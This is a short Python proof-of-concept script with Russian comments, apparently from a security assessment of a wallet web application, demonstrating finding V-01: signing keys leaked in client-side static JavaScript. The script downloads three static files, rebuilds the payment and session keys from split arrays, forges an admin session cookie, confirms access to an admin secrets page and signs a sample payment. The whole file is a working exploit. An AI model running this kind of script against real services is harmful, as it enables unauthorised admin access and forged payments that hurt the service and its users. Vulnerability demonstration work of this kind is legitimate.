# -*- coding: utf-8 -*-
"""V-01. Ключи подписи утекают в статике и совпадают с дефолтом.

/static/pay.js, /static/wallet.js и /static/legacy-sync.js по кускам собирают
PAYMENT_KEY ("office-wallet-pay-key") и SESSION_KEY ("office-wallet-session-key").
Любой анонимный клиент скачивает их и подделывает сессию/подпись платежа.
"""
import json
import re

from wallet_client import Client, parser, forge_session_cookie, sign_payment, banner, ok, fail


def arr(js, name):
    m = re.search(name + r"\s*:?\s*=?\s*\[([^\]]*)\]", js)
    if not m:
        return None
    return json.loads("[" + m.group(1) + "]")


def main():
    a = parser("Утечка ключей подписи в клиентской статике").parse_args()
    c = Client(a.base)

    pay = c.get("/static/pay.js")[2].decode("utf-8", "replace")
    wal = c.get("/static/wallet.js")[2].decode("utf-8", "replace")
    leg = c.get("/static/legacy-sync.js")[2].decode("utf-8", "replace")

    pay_parts = arr(pay, "parts")
    key_parts = arr(wal, "keyParts")
    sk_tail = arr(leg, "__SK_TAIL__")
    if not (pay_parts and key_parts and sk_tail):
        fail("не удалось разобрать массивы в статике")

    payment_key = "".join(pay_parts)
    session_key = "".join(key_parts) + "".join(sk_tail)
    banner(f"PAYMENT_KEY  = {payment_key}")
    banner(f"SESSION_KEY  = {session_key}")

    # Проверка, что ключ рабочий: подделанная куки принимается сервером.
    c2 = Client(a.base)
    c2.cookies["ow_session"] = forge_session_cookie(6, "admin", session_key)
    st, _, _ = c2.get("/admin/secrets")
    if st != 200:
        fail(f"сервер не принял сессию на утёкшем ключе: {st}")
    ok("SESSION_KEY рабочий — admin-сессия подделана без пароля")

    sig = sign_payment(1, 5000, "1", payment_key)
    banner(f"пример подписи платежа op=1 amount=5000 -> {sig}")
    ok("оба ключа восстановлены из статики и подтверждены")


if __name__ == "__main__":
    main()
